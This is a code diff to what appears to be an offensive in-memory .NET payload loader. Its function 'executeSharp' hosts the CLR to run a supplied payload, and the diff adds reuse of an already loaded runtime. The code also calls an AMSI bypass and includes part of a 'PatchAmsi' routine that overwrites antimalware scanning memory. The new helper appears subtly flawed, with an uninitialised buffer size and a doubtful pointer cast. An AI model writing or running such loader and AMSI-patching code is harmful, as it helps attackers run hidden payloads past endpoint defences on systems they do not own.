@@ -104,20 +104,35 @@ int executeSharp(LPVOID lpPayload)
 		return -1;
 	}
 
-	hr = pMetaHost->GetRuntime(clrVersion, IID_ICLRRuntimeInfo, (VOID**)&pRuntimeInfo);
+	IEnumUnknown* pEnumerator;
+	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
+	hr = pMetaHost->EnumerateLoadedRuntimes(hProcess, &pEnumerator);
 
-	if(FAILED(hr))
+	if (FAILED(hr))
 	{
-		printf("ICLRMetaHost::GetRuntime failed w/hr 0x%08lx\n", hr);
+		printf("pMetaHost->EnumerateLoadedRuntimes failed w/hr 0x%08lx\n", hr);
 		return -1;
 	}
 	
-	hr = pRuntimeInfo->IsLoadable(&bLoadable);
+	BOOL isloaded = CheckIfClrIsLoaded(clrVersion, pEnumerator, (VOID**)&pRuntimeInfo);
 
-	if(FAILED(hr) || !bLoadable)
+	if(!isloaded)
 	{
-		printf("ICLRRuntimeInfo::IsLoadable failed w/hr 0x%08lx\n", hr);
-		return -1;
+		hr = pMetaHost->GetRuntime(clrVersion, IID_ICLRRuntimeInfo, (VOID**)&pRuntimeInfo);
+
+		if (FAILED(hr))
+		{
+			printf("ICLRMetaHost::GetRuntime failed w/hr 0x%08lx\n", hr);
+			return -1;
+		}
+
+		hr = pRuntimeInfo->IsLoadable(&bLoadable);
+
+		if (FAILED(hr) || !bLoadable)
+		{
+			printf("ICLRRuntimeInfo::IsLoadable failed w/hr 0x%08lx\n", hr);
+			return -1;
+		}
 	}
 
 	hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&pRuntimeHost);
@@ -128,8 +143,11 @@ int executeSharp(LPVOID lpPayload)
 		return -1;
 	}
 
-	hr = pRuntimeHost->Start();
-	
+	if (!isloaded)
+	{
+		hr = pRuntimeHost->Start();
+	}
+
 	if(FAILED(hr))
 	{
 		printf("CLR failed to start w/hr 0x%08lx\n", hr);
@@ -155,7 +173,7 @@ int executeSharp(LPVOID lpPayload)
 	}
 
 	//Amsi bypass
-	if (amsiflag[0] == 0x01)
+	if (amsiflag[0] == '\x01')
 	{
 		BypassAmsi();
 	}
@@ -295,6 +313,23 @@ VOID PatchAmsi()
 	memcpy(addr, amsipatch, patchsize);
 
 	VirtualProtect(addr, patchsize, oldProtect, &oldProtect);
+}
+
+BOOL CheckIfClrIsLoaded(LPCWSTR versione, IEnumUnknown* pEnumerator, LPVOID * pRuntimeInfo) {
+	ULONG fetched = 0;
+	DWORD bufferSize;
+	auto retval = FALSE;
+	wchar_t buffer[MAX_PATH];
+	//ICLRRuntimeInfo
+	while (SUCCEEDED(pEnumerator->Next(1, (IUnknown **)&pRuntimeInfo, &fetched)) && fetched > 0) {
+		if ((SUCCEEDED(((ICLRRuntimeInfo*)pRuntimeInfo)->GetVersionString(buffer, &bufferSize))))
+			if (wcscmp(buffer, versione) == 0) {
+				retval = TRUE;
+				break;
+			}
+	}
+
+	return retval;
 }
 
 
